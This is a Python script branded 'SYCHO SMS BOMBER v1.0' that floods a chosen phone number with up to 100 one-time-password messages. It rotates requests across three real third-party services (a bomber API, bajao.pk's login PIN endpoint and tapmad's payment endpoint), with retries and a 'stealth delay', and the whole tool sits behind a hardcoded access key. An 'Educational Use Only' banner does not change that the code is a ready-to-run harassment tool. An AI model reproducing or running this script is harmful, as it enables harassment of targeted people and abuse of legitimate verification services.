#!/usr/bin/env python3
import requests
import time
import sys
import os
from colorama import init, Fore, Style, Back
import re
from datetime import datetime

# Initialize colorama and set up logging
init()
LOG_FILE = "sycho_log.txt"
USER_LOG_FILE = "user_log.txt"

# Constants
KEY = "Sycho"  # Secure access key
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"

# Function to initialize or append to log file
def log_action(message):
    """Log actions to a file for stealth tracking."""
    with open(LOG_FILE, "a") as log:
        log.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

# Function to log user activity
def log_user_activity(action, key=None, phone=None, count=None):
    """Log user access attempts and commands."""
    with open(USER_LOG_FILE, "a") as log:
        entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Action: {action}"
        if key:
            entry += f", Key: {key}"
        if phone:
            entry += f", Phone: {phone}"
        if count:
            entry += f", OTP Count: {count}"
        entry += "\n"
        log.write(entry)

# Function to validate phone number
def is_valid_phone(phone):
    """Validate phone number with regex for professional input handling."""
    return bool(re.match(r'^\+?\d{10,15}$', phone))

# Function to display the ASCII art banner with dragon
def display_banner():
    """Display a custom ASCII art banner with dragon below."""
    banner = f"""
{Back.BLACK + Fore.RED + Style.BRIGHT}/**
{Back.BLACK + Fore.RED + Style.BRIGHT}* **********************************************************
{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
{Back.BLACK + Fore.YELLOW + Style.BRIGHT}* *{Fore.YELLOW} oooooooo8 ooooo  oooo oooooooo8 ooooo ooooo  ooooooo   *
{Back.BLACK + Fore.GREEN + Style.BRIGHT}* *{Fore.GREEN}888          888  88 o888     88  888   888 o888   888o *
{Back.BLACK + Fore.CYAN + Style.BRIGHT}* *{Fore.CYAN} 888oooooo     888   888          888ooo888 888     888 *
{Back.BLACK + Fore.MAGENTA + Style.BRIGHT}* *{Fore.MAGENTA}        888    888   888o     oo  888   888 888o   o888 *
{Back.BLACK + Fore.RED + Style.BRIGHT}* *{Fore.RED}o88oooo888    o888o   888oooo88  o888o o888o  88ooo88   *
{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
{Back.BLACK + Fore.RED + Style.BRIGHT}* **********************************************************
{Back.BLACK + Fore.RED + Style.BRIGHT}   /\\====>              _____
{Back.BLACK + Fore.RED + Style.BRIGHT}   \\  \\===>         __/_  __/
{Back.BLACK + Fore.RED + Style.BRIGHT}   /\\_/===>  ___  _/_  _/
{Back.BLACK + Fore.RED + Style.BRIGHT}   |/ 0 0  \\/ _ \\/ _ \/
{Back.BLACK + Fore.RED + Style.BRIGHT}   ===(_)-(_)\\___/\\___/ 
{Back.BLACK + Fore.RED}=======================================
{Back.BLACK + Fore.RED}         SYCHO SMS BOMBER v1.0
{Back.BLACK + Fore.RED}=======================================
{Back.BLACK + Fore.RED + Style.DIM}   Created by @SychoX2006 (telegram)      {Style.RESET_ALL}
{Back.BLACK + Fore.RED + Style.DIM}   Website: tlz.vercel.app {Style.RESET_ALL}
{Back.BLACK + Fore.RED + Style.DIM}   ⚠️ Educational Use Only!         {Style.RESET_ALL}
{Back.BLACK + Fore.RED}=======================================
{Style.RESET_ALL}"""
    print(banner)
    log_action("Banner displayed. Operation initialized.")

# Function to check access key with anti-brute-force delay
def check_key():
    """Authenticate with a secure key check and delay on failure."""
    attempts = 0
    max_attempts = 3
    while attempts < max_attempts:
        print(f"{Fore.RED}🔑 Enter Access Key: {Style.RESET_ALL}")
        key_input = input().strip()
        log_user_activity("Key Attempt", key=key_input)
        if key_input == KEY:
            print(f"{Fore.GREEN}✅ Access Granted! Welcome,{Style.RESET_ALL}")
            log_action("Access granted successfully.")
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"{Fore.RED}❌ Invalid Key! {remaining} attempts remaining.{Style.RESET_ALL}")
            log_action(f"Failed login attempt {attempts}/{max_attempts}.")
            time.sleep(2 ** attempts)  # Exponential backoff (2s, 4s, 8s)
    print(f"{Fore.RED}🔒 Max attempts reached. Exiting.{Style.RESET_ALL}")
    log_action("Max login attempts exceeded. Operation terminated.")
    sys.exit(1)
    
    # API endpoint
API_URL = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php"

# Log file for debugging
LOG_FILE = "sms_ghost.log"

# Function to send OTPs with advanced tracking
def send_otp(phone, count):
    """Deploy OTPs with professional-grade error handling and logging."""
    if not is_valid_phone(phone):
        print(f"{Fore.RED}📵 Invalid phone number! Use +923xxxxxxxxx format.{Style.RESET_ALL}")
        log_action(f"Invalid phone number: {phone}")
        return
    if not isinstance(count, int) or count < 1 or count > 100:
        print(f"{Fore.RED}❌ OTP count must be 1-100.{Style.RESET_ALL}")
        log_action(f"Invalid OTP count: {count}")
        return

    log_user_activity("OTP Operation", phone=phone, count=count)
    print(f"{Fore.YELLOW}💥 Sending OTP .{Style.RESET_ALL}")
    log_action(f"Starting OTP Sending For {phone} with count {count}.")
    success_count = 0
    for i in range(count):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; Termux) AppleWebKit/537.36",
                "Accept": "application/json"
            }
            # Rotate between APIs for each request
            if i % 3 == 0:
                # First API: shadowscriptz
                api_number = phone.lstrip('+').strip()
                params = {"number": api_number}
                for attempt in range(3):  # Retry logic from send_sms
                    try:
                        response = requests.get(API_URL, params=params, headers=headers)
                        if response.status_code == 200:
                            break
                        else:
                            raise requests.RequestException(f"Status code {response.status_code}")
                    except requests.RequestException as e:
                        if attempt == 2:
                            raise e
                        time.sleep(0.5)
            elif i % 3 == 1:
                # Second API: bajao.pk
                url = f"https://bajao.pk/api/v2/login/generatePin?uuid={phone}"
                response = requests.post(url, headers=headers)
            else:
                # Third API: tapmad
                url = "https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage"
                payload = {
                    "Version": "V1",
                    "Language": "en",
                    "Platform": "web",
                    "ProductId": 1733,
                    "MobileNo": phone,
                    "OperatorId": "100007",
                    "URL": "https://www.tapmad.com/sign-up",
                    "source": "organic",
                    "medium": "organic"
                }
                response = requests.post(url, headers=headers, json=payload)
            
            success_count += 1
            print(f"{Fore.GREEN}✅ OTP {i + 1}/{count} Sended. Status: {response.status_code}{Style.RESET_ALL}")
            log_action(f"OTP {i + 1}/{count} Sent successfully. Status: {response.status_code}")
        except requests.RequestException as e:
            print(f"{Fore.RED}⚠️ OTP {i + 1} failed: {e}{Style.RESET_ALL}")
            log_action(f"OTP {i + 1} failed: {e}")
        time.sleep(0.7)  # Stealth delay
    log_action(f"Deployment complete. Success: {success_count}/{count}")

# Main function with pro-hacker workflow and restart behavior
def main():
    """Execute the SMS bomber with a professional hacker interface."""
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)  # Fresh log for new session
    if os.path.exists(USER_LOG_FILE):
        os.remove(USER_LOG_FILE)  # Fresh user log for new session
    log_action("SMS Bomber v1.0 launched.")
    while True:
        os.system("clear")  # Clear the screen for a fresh start
        display_banner()
        if not check_key():
            return
        print(f"\n{Fore.RED}📱 Enter Target Phone Number (+923xxxxxxxxx): {Style.RESET_ALL}")
        phone = input().strip()
        print(f"{Fore.RED}🔢 Enter OTP Count (1-100): {Style.RESET_ALL}")
        try:
            count = int(input())
            send_otp(phone, count)
        except ValueError:
            print(f"{Fore.RED}❌ Invalid input detected. Enter a numeric value.{Style.RESET_ALL}")
            log_action("Invalid input detected during OTP count entry.")
        print(f"\n{Fore.YELLOW}🔥 Continue operation? (y/n): {Style.RESET_ALL}")
        if input().lower() != 'y':
            print(f"{Fore.CYAN}👋 Exit successful. Stay Healthy, SychoX2006.{Style.RESET_ALL}")
            log_action("Operation Canceled.")
            break
        log_action("Restarting operation with screen clear.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🚨 Operation canceled. Cleaning ....{Style.RESET_ALL}")
        log_action("Operation aborted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}❌ failure: {e}. Erasing...{Style.RESET_ALL}")
        log_action(f"failure: {e}")
        sys.exit(1)
